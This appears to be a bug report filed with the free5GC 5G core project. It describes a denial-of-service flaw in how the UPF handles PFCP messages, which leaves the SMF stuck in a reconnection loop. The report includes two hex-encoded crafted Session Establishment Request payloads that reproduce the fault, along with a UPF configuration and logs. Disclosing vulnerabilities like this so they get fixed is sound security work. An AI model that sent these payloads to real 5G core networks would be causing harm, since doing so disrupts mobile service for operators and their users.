title: [Bugs]PFCP Protocol Handling Vulnerability Leading to SMF-UPF Connection Denial of Service
body: ## Bug Decription A vulnerability in Free5GC's PFCP message processing allows attackers to disrupt SMF-UPF connections by sending specially crafted PFCPSessionEstablishmentReq messages, causing persistent reconnection loops and service degradation. ## To Reproduce The vulnerability exists in the PFCP (Packet Forwarding Control Protocol) message handling mechanism between SMF and UPF components: 1.Root Cause: The UPF component improperly handles certain malformed PFCPSessionEstablishmentReq messages, causing the SMF to perceive connection failures. 2.Attack Vector: By sending specifically crafted PFCP Session Establishment Request messages to the UPF's PFCP port (default: 8805). message1:'210500640000000000000000000058dd0039000d02123456789abcdef00a0000010003000e006c0004000000c8002c00020200003c000500c0a8010100010017003800020064001d000400007530000200050014000100' message2:'213200530000000000000000000000000039000d02123456789abcdef00a0000010003000e006c0004000000c8002c00020200003c000500c0a8010100010017003800020064001d000400007530000200050014000100' These two PFCP messages must be sent consecutively to trigger this vulnerability. an attacker can trigger a chain of events: UPF processes the malicious message but enters an inconsistent state SMF detects PFCP heartbeat failures and releases UPF resources SMF enters an infinite reconnection loop, continuously attempting to re-establish association ## Expected Behavior SMF will reconnect to UPF. ## Screenshots ## Environment **Please, complete the following information:** - free5GC Version: [e.g. v4.0.1] - OS: [e.g. Ubuntu 20.04 Server] - Kernel version: [e.g. 5.15.0-0-generic] - go version: [e.g. 1.21.8 linux/amd64] - C compiler version (optional): [e.g. gcc version 1.1.0] ## Trace Files ### Configuration Files version: 1.0.3 description: UPF initial local configuration pfcp: addr: 127.0.0.8 # IP addr for listening nodeID: 127.0.0.8 # External IP or FQDN can be reached retransTimeout: 1s # retransmission timeout maxRetrans: 3 # the max number of retransmission peers: - addr: 127.0.0.8 - addr: 127.0.0.100 - addr: 192.168.20.3 - addr: 192.168.0.3 # GTP-U Configuration gtpu: forwarder: gtp5g # The IP list of the N3/N9 interfaces on this UPF # You can bind this to a specific IP from your available subnets (e.g., 10.10.0.1). # Alternatively, you can bind it to all interfaces using 0.0.0.0. # If you bind to a specific IP, ensure SMF uses the same IP in its N3 configuration. # If you bind to all (0.0.0.0), SMF can use any of the available UPF IPs, but do not use 0.0.0.0 in SMF. ifList: - addr: 127.0.0.8 type: N3 # name: upf.5gc.nctu.me # ifname: gtpif # mtu: 1400 # Supported DNNs # List of Data Network Names (DNN) supported by this UPF. dnnList: - dnn: internet # Data Network Name cidr: 10.60.0.0/16 # Classless Inter-Domain Routing for assigned IPv4 pool of UE - dnn: internet # Data Network Name cidr: 10.61.0.0/16 # Classless Inter-Domain Routing for assigned IPv4 pool of UE # natifname: eth0 ### Log File 2025-11-21T16:38:10.997207510Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleHeartbeatRequest 2025-11-21T16:38:10.998572325Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleAssociationSetupRequest 2025-11-21T16:38:10.998774516Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:192.168.1.1] New node 2025-11-21T16:38:17.369121974Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleHeartbeatRequest 2025-11-21T16:38:27.379344236Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleHeartbeatRequest 2025-11-21T16:38:33.067892903Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleHeartbeatRequest 2025-11-21T16:38:33.068634949Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleSessionEstablishmentRequest 2025-11-21T16:38:33.068681531Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:192.168.1.1][CPSEID:0x123456789abcdef0][UPSEID:0x1] New session 2025-11-21T16:38:46.397540213Z [ERRO][SMF][Main] PFCP Heartbeat error: SendPfcpHeartbeatRequest error: request Transaction [19]: retry-out 2025-11-21T16:38:46.397721099Z [INFO][SMF][Main] Release all resources of UPF [127.0.0.8] 2025-11-21T16:38:46.397745934Z [INFO][SMF][Main] Sending PFCP Association Request to UPF[127.0.0.8] 2025-11-21T16:38:55.406598374Z [WARN][SMF][Main] Failed to setup an association with UPF[[127.0.0.8]], error:request Transaction [20]: retry-out ## System Architecture (Optional) ubantu22.04
